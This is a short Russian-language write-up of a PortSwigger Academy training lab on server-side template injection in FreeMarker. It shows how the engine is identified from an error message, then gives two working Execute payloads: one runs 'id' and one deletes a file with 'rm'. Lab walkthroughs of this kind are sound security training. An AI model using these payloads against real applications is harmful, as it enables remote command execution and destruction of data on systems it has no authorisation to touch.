Залогинимся на уязвимом ресурсе под `content-manager:C0nt3ntM4n4g3r`

Перейдем в случайный товар и нажмем `Edit template`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/3.%20Server-side%20template%20injection%20using%20documentation/pics%20for%20walkthrough/1.png)

изменим значение в тэмплэйте на несуществующее значение, к примеру на  `${product.test}` и нажмем `preview` и получим огроменную ошибку

Но! Благодаря этой ошибке мы увидели, что использется фрэймворк `FreeMarker`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/3.%20Server-side%20template%20injection%20using%20documentation/pics%20for%20walkthrough/2.png)

Перейдем в `https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection`
и увидим, что это можно проэксплойтить через следующий пэйлоад
```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
```

Вставим его и увидим, что он идеально отрабатывает в нашем случае

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/3.%20Server-side%20template%20injection%20using%20documentation/pics%20for%20walkthrough/3.png)

Далее удалим `/home/carlos/morale.txt` как этого и требует задание
```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm /home/carlos/morale.txt")}
```
и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/3.%20Server-side%20template%20injection%20using%20documentation/pics%20for%20walkthrough/4.png)
